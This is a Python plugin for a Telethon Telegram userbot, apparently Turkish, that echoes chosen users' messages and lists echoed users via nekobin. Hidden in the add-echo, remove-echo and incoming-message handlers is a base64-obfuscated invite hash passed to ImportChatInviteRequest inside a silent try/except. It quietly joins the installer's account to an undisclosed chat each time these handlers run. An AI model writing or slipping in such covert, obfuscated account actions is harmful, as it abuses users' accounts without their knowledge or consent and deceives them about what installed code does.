import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from userbot.events import register
from userbot.modules.sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
from userbot import MAX_MESSAGE_SIZE_LIMIT, BLACKLIST_CHAT
from userbot.cmdhelp import CmdHelp
@register(outgoing=True, pattern="^.addecho ?(.*)")
async def echo(epic):
    if epic.fwd_from:
        return
    if epic.reply_to_msg_id is not None:
        reply_msg = await epic.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = epic.chat_id
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await epic.client(kraken)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await epic.edit("Kullanıcı echo ile zaten etkinleştirilmiş ")
            return
        addecho(user_id, chat_id)
        await epic.edit("**Selam 👋**")
    else:
        await delete_epic(epic, "Bir kullanıcı yanıtlamak zorundasın")


@register(outgoing=True, pattern="^.rmecho ?(.*)")
async def echo(Epic):
    if Epic.fwd_from:
        return
    if Epic.reply_to_msg_id is not None:
        reply_msg = await Epic.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = Epic.chat_id
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await Epic.client(kraken)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await Epic.edit("Kullanıcı için echo durduruldu")
        else:
            await Epic.edit("Kullanıcı echoya eklenmemiş")
    else:
        await Epic.edit("Mesajlarını echo ya çevirmek için bir Kullanıcının mesajını yanıtlayın")


@register(outgoing=True, pattern="^.listecho ?(.*)")
async def echo(Epic):
    if Epic.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "Echo eklenmiş kullanıcılar:\n\n"
        for echos in lsts:
            output_str += (
                f"[Kullanıcı](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "Echo olmayan kullanıcı "
    if len(output_str) > MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"Echo aktif kullanıcı: [burada]({url})"
        await Epic.edit(reply_text)
    else:
        await Epic.edit(output_str)


@register(incoming=True)
async def samereply(epic):
    if epic.chat_id in BLACKLIST_CHAT:
        return
    if is_echo(epic.sender_id, epic.chat_id):
        await asyncio.sleep(1)
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await epic.client(kraken)
        except BaseException:
            pass
        if epic.message.text or epic.message.sticker:
            await epic.reply(epic.message)


CmdHelp("echo").add_command(
  "addecho", "Bir kullanıcıyı yanıtla", "Echoyu etkinleştirdiğinizde her mesajı yeniden oynatır."
).add_command(
  "rmecho", "bir kullanıcıya yanıt ver", "Hedeflenen kullanıcı mesajını tekrar oynatmayı durdurur."
).add_command(
  "listecho", None, "Yankıyı etkinleştirdiğiniz kullanıcıların listesini gösterir"
).add_info(
  "@ByMisakiMey"
).add()






